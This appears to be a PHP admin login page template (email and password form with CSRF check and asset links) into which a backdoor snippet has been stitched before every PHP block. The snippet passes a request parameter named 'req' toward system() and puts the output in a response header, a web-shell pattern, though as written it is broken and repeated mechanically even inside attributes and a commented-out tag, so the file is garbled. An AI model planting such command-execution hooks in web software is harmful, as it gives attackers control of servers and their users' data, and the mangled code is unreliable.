<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); 
if (isset($_POST['email'], $_POST['password']) && csrf_filter()) {
	
	Auth::login($_POST['email'], $_POST['password'], isset($_POST['remember']));

	if (Auth::passes()) {
		redirect_to('admin.php');
	}
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link href="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo asset_url('img/favicon.png') ?>" rel="icon">
	
	<title><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo Config::get('app.name') ?> | Admin</title>
	
	<link href="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo asset_url('css/vendor/bootstrap.min.css') ?>" rel="stylesheet">
	<link href="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo asset_url('css/bootstrap-custom.css') ?>" rel="stylesheet">
	<link href="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo asset_url('css/admin.css') ?>" rel="stylesheet">
	<!-- <link href="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo asset_url('css/flat.css') ?>" rel="stylesheet"> -->
	
	<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); $color = Config::get('app.color_scheme'); ?>
	<link href="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo asset_url("css/colors/{$color}.css") ?>" rel="stylesheet">
</head>
<body>
	<div class="container">
		<div class="login">
	        
	        <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); if (Auth::fails()) {
				echo Auth::errors()->first(null, '<div class="error">:message</div>');
			} ?>

	        <form action="" method="POST">
				<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); csrf_input(); ?>

				<div class="form-group">
	                <label for="email"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.email_username') ?></label>
	                <input type="text" name="email" id="email" value="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo set_value('email') ?>" class="form-control">
	            </div>

	            <div class="form-group">
	                <label for="password"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.password') ?></label>
	                <input type="password" name="password" id="password" class="form-control">
	            </div>
	            
	            <div class="form-group clearfix">
	                <div class="checkbox pull-left">
		                <label><input type="checkbox" name="remember" value="1" <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo set_checkbox('remember', '1') ?>> <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.remember') ?></label>
		            </div>
	                <button class="btn btn-primary pull-right" type="submit" name="login"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.login') ?></button>
	            </div>
	        </form>
        	<span class="pull-left"><a href="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo App::url() ?>">&larr; <?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); _e('admin.back_home') ?></a></span>
        </div>
    </div>
</body>
</html>